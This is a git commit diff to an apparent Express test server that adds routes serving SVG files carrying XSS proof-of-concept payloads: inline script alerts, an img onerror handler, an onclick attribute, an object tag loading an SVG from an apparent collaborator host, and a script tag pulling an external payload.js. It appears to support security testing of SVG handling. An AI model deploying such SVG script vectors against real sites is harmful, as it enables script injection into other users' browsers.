b9ba56e9923d1dac85e749888dbdac74964a4d3a
aymen kani <77794514+aymenkani@users.noreply.github.com>
2025-01-20 18:26:05 +0100

    Update index.js

--- index.js
+++ index.js
@@ -30,13 +30,56 @@ app.use((req, res, next) => {
   next();
 });
 
-app.get('/image.svg', (req, res) => {
+app.get('/image0.svg', (req, res) => {
   // Serve JavaScript instead of an image
   res.setHeader('Content-Type', 'image/svg+xml');
   res.send(`<svg xmlns="http://www.w3.org/2000/svg">
+  <h1>hi there</h1>
+  </svg>
   <script>
     alert("This is a script in an SVG!");
   </script>
+  <img src=x onerror=alert(1) />
+  <script>
+    alert("This is a script in an SVG!");
+  />
+  
+</svg>`);
+});
+
+app.get('/image1.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<svg xmlns="http://www.w3.org/2000/svg">
+  
+  
+  <script>
+    alert("This is a script in an SVG!");
+  </script>
+  
+  
+</svg>`);
+});
+
+app.get('/image2.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<object type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>`);
+});
+
+app.get('/image3.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<svg xmlns="http://www.w3.org/2000/svg" onclick="alert('SVG clicked!')">
+  <rect width="100" height="100" fill="red"></rect>
+</svg>`);
+});
+
+app.get('/image4.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<svg xmlns="http://www.w3.org/2000/svg" >
+  <script src="alertwebsite.ct.ws/payload.js" />
 </svg>`);
 });
 
